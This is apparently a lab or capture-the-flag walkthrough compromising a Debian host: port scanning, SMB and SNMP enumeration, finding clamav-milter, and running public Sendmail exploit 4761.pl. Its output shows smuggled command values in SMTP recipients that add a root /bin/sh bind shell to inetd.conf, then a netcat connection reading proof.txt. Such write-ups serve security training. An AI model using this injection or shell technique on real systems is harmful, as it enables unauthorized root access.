Ran autorecon on 192.168.245.42
```
22/tcp    open  ssh          syn-ack ttl 61 OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
25/tcp    open  smtp         syn-ack ttl 61 Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.216], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http         syn-ack ttl 61 Apache httpd 1.3.33 ((Debian GNU/Linux))
139/tcp   open  netbios-ssn? syn-ack ttl 61
199/tcp   open  smux         syn-ack ttl 61 Linux SNMP multiplexer
445/tcp   open  netbios-ssn  syn-ack ttl 61 Samba smbd 3.0.14a-Debian (workgroup: 
60000/tcp open  ssh          syn-ack ttl 61 OpenSSH 3.8.1p1 Debian 8.sarge.6 

137/udp   open          netbios-ns      udp-response ttl 61 Samba nmbd netbios-ns (workgroup: WORKGROUP)
138/udp   open|filtered netbios-dgm     no-response
139/udp   closed        netbios-ssn     port-unreach ttl 61
158/udp   open|filtered pcmail-srv      no-response
161/udp   open          snmp            udp-response ttl 61 SNMPv1 server; U.C. 
```

Ran smbclient. Nothing interesting there.
```
smbclient -L //192.168.245.42/ -N                

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
        ADMIN$          IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------
        0XBABE               0xbabe server (Samba 3.0.14a-Debian) brave pig
        Workgroup            Master
        ---------            -------
        WORKGROUP            0XBABE
```

Enumerate users with enum4linux-ng. One user admin.
```
enum4linux-ng 192.168.245.42 -A -Gm -R -t 15
[+] Found user '0XBABE\Administrator' (RID 500)
```

Go to port 80. Derive `ifyoudontpwnmeuran00b` from the bits on the website using cyberchef.

Enumerate snmp with snmp-check
```
snmp-check 192.168.245.42 -c public -v 2c
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.245.42:161 using SNMPv2c and community 'public'

[*] System information:

  Host IP address               : 192.168.245.42
  Hostname                      : 0xbabe.local
  Description                   : Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
  Contact                       : Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)
  Location                      : Unknown (configure /etc/snmp/snmpd.local.conf)
  Uptime snmp                   : 01:06:13.74
  Uptime system                 : 01:05:37.43
  System date                   : 2026-11-18 11:00:37.0

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 64
  TCP segments received         : 1013819
  TCP segments sent             : 983855
  TCP segments retrans          : 141
  Input datagrams               : 1027412
  Delivered datagrams           : 1027276
  Output datagrams              : 996133

[*] Network interfaces:

  Interface                     : [ up ] lo
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 10 Mbps
  MTU                           : 16436
  In octets                     : 0
  Out octets                    : 0

  Interface                     : [ up ] eth0
  Id                            : 2
  Mac Address                   : 00:50:56:ab:5f:86
  Type                          : ethernet-csmacd
  Speed                         : 100 Mbps
  MTU                           : 1500
  In octets                     : 160789245
  Out octets                    : 463915315

  Interface                     : [ down ] sit0
  Id                            : 3
  Mac Address                   : 00:00:00:00:5f:86
  Type                          : unknown
  Speed                         : 0 Mbps
  MTU                           : 1480
  In octets                     : 0
  Out octets                    : 0


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast           
  1                     127.0.0.1             255.0.0.0             0                   
  2                     192.168.245.42        255.255.255.0         1                   

[*] Routing information:

  Destination           Next hop              Mask                  Metric              
  0.0.0.0               192.168.245.254       0.0.0.0               1                   
  192.168.245.0         0.0.0.0               255.255.255.0         0                   

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State               
  0.0.0.0               25                    0.0.0.0               0                     listen              
  0.0.0.0               80                    0.0.0.0               0                     listen              
  0.0.0.0               139                   0.0.0.0               0                     listen              
  0.0.0.0               199                   0.0.0.0               0                     listen              
  0.0.0.0               445                   0.0.0.0               0                     listen              

[*] Listening UDP ports:

  Local address         Local port          
  0.0.0.0               137                 
  0.0.0.0               138                 
  0.0.0.0               161                 
  192.168.245.42        137                 
  192.168.245.42        138                 

[*] Processes:

  Id                    Status                Name                  Path                  Parameters          
  1                     runnable              init                  init [2]                                  
  2                     runnable              ksoftirqd/0           ksoftirqd/0                               
  3                     runnable              events/0              events/0                                  
  4                     runnable              khelper               khelper                                   
  5                     runnable              kacpid                kacpid                                    
  99                    runnable              kblockd/0             kblockd/0                                 
  109                   runnable              pdflush               pdflush                                   
  110                   runnable              pdflush               pdflush                                   
  111                   runnable              kswapd0               kswapd0                                   
  112                   runnable              aio/0                 aio/0                                     
  255                   runnable              kseriod               kseriod                                   
  276                   runnable              scsi_eh_0             scsi_eh_0                                 
  284                   runnable              khubd                 khubd                                     
  348                   runnable              shpchpd_event         shpchpd_event                             
  380                   runnable              kjournald             kjournald                                 
  935                   runnable              vmmemctl              vmmemctl                                  
  1177                  runnable              vmtoolsd              /usr/sbin/vmtoolsd                        
  3768                  running               syslogd               /sbin/syslogd                             
  3771                  runnable              klogd                 /sbin/klogd                               
  3775                  runnable              clamd                 /usr/local/sbin/clamd                      
  3778                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
  3787                  runnable              inetd                 /usr/sbin/inetd                           
  3791                  runnable              nmbd                  /usr/sbin/nmbd        -D                  
  3793                  runnable              smbd                  /usr/sbin/smbd        -D                  
  3797                  running               snmpd                 /usr/sbin/snmpd       -Lsd -Lf /dev/null -p /var/run/snmpd.pid
  3803                  runnable              sshd                  /usr/sbin/sshd                            
  3819                  runnable              smbd                  /usr/sbin/smbd        -D                  
  3882                  runnable              sendmail-mta          sendmail: MTA: accepting connections                      
```

Searchsploit clamav for exploits. 
```
searchsploit clamav                              
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Clam Anti-Virus ClamAV 0.88.x - UPX Compressed PE File Heap Buffer Overflow                                               | linux/dos/28348.txt
ClamAV / UnRAR - .RAR Handling Remote Null Pointer Dereference                                                            | linux/remote/30291.txt
ClamAV 0.91.2 - libclamav MEW PE Buffer Overflow                                                                          | linux/remote/4862.py
ClamAV < 0.102.0 - 'bytecode_vm' Code Execution                                                                           | linux/local/47687.py
ClamAV < 0.94.2 - JPEG Parsing Recursive Stack Overflow (PoC)                                                             | multiple/dos/7330.c
ClamAV Daemon 0.65 - UUEncoded Message Denial of Service                                                                  | linux/dos/23667.txt
ClamAV Milter - Blackhole-Mode Remote Code Execution (Metasploit)                                                         | linux/remote/16924.rb
ClamAV Milter 0.92.2 - Blackhole-Mode (Sendmail) Code Execution (Metasploit)                                              | multiple/remote/9913.rb
Sendmail with clamav-milter < 0.91.2 - Remote Command Execution                                                           | multiple/remote/4761.pl
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------

searchsploit -m 4761.pl
```
We realise that from the snmp data that sendmail is also one of the processes. Grab 4761.pl

Run 4761.pl
```
perl 4761.pl 192.168.245.42                                                                                   
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.245.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Wed, 18 Nov 2026 11:06:01 -0500; (No UCE/UBE) logging access from: [192.168.45.216](FAIL)-[192.168.45.216]
250-localhost.localdomain Hello [192.168.45.216], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 6AIG618Q012418 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
```

We realised port 31337 is now open and we can go listen with netcat and obtain root.
```
nmap -sVC -p- -v -T4 -sT --open 192.168.245.42       
...
...
Discovered open port 31337/tcp on 192.168.245.42

nc 192.168.245.42 31337                       
whoami
root
cd /root
cat proof.txt
```

